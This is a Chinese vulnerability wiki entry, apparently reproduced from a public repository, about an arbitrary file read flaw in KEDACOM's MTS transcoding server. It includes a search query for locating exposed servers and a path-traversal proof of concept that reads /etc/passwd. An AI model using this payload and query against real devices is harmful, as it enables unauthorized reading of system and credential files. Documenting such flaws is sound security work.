---
title: "科达 MTS转码服务器 任意文件读取漏洞"
date: 2026-10-16 09:11:23
categories:
  - WebSecurity
  - CVE
  - "Web应用"
  - "科达-MTS转码服务器"
tags:
  - "科达-MTS转码服务器"
  - "任意文件读取"
  - "漏洞复现"
---
## 漏洞描述

KEDACOM MTS转码服务器存在任意文件读取漏洞，攻击这通过漏洞可以读取服务器任意信息

## 漏洞影响

```
MTS转码服务器
```

## 网络测绘

```
app="MTS转码服务器"
```

## 漏洞复现

登录页面

![image-20220525145422524](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202205251454625.png)

验证POC

```
/../../../../../../../../etc/passwd
```

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202205251454380.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/%E7%A7%91%E8%BE%BE-MTS%E8%BD%AC%E7%A0%81%E6%9C%8D%E5%8A%A1%E5%99%A8-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md)
